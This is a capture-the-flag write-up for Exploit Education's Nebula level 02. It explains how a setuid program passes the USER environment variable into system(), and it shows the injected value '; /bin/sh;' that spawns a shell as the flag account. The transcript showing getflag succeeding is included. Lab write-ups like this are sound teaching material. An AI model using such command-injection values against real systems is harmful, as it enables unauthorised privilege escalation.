### [Exploit Education Level 2](https://exploit.education/nebula/level-02/)

## Challenge
[Challenge](https://exploit.education/nebula/level-02/)<br>
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
To do this level, log in as the `level02` account with the password `level02`. Files for this level can be found in `/home/flag02`.

## Vulnerability
This program is similar to the last challenge. 
``` cpp
asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
printf("about to call system(\"%s\")\n", buffer);
```
We can see here that the command echo is copied into the buffer along with the environment variable `USER`
if we replace the `USER` env variable with `;/bin/sh` a shell will be executed after the `echo` command

## Exploitation
The `flag02` program has the set user id bit set
``` bash
-rwsr-x--- 1 flag02 level02 7438 2011-11-20 21:22 flag02
```
Lets add `; /bin/sh;` to the env variable and execute the program
``` bash
level02@nebula:/home/flag02$ USER='; /bin/sh;'
level02@nebula:/home/flag02$ env | grep USER
USER=; /bin/sh;
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo ; /bin/sh; is cool")
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

### Solved!
